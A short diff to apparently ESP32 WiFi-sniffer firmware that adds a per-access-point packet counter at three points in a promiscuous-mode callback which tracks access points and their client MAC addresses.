@@ -23172,6 +23450,7 @@ static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t 
                     if (memcmp(sniffer_aps[i].bssid, ap_mac, 6) == 0) {
                         sniffer_aps[i].last_seen = esp_timer_get_time() / 1000;
                         sniffer_aps[i].rssi = pkt->rx_ctrl.rssi;
+                        sniffer_aps[i].packet_count++;
                         break;
                     }
                 }
@@ -23330,6 +23609,7 @@ static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t 
                 }
                 
                 if (ap_index >= 0) {
+                    sniffer_aps[ap_index].packet_count++;
                     if (sniff_debug) {
                         MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: ACCEPTED - Adding client %02X:%02X:%02X:%02X:%02X:%02X to AP %s", 
                                    sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
@@ -23444,6 +23724,7 @@ static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t 
         }
         
         if (ap_index >= 0) {
+            sniffer_aps[ap_index].packet_count++;
             if (sniff_debug) {
                 MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: ACCEPTED - Adding client %02X:%02X:%02X:%02X:%02X:%02X to AP %s", 
                            sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], 
